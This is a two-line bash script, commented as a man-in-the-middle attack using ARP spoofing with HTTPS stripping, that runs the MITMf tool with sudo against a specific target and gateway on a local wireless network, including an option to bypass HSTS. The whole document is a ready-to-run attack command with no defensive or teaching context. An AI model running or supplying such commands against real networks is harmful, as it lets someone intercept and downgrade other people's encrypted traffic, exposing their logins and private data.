#!/usr/bin/env bash

#MITM via ArpSpoofing with Https stripping
sudo mitmf -i wlan0 --spoof --arp --target 10.0.0.14 --gateway 10.0.0.1 --hsts
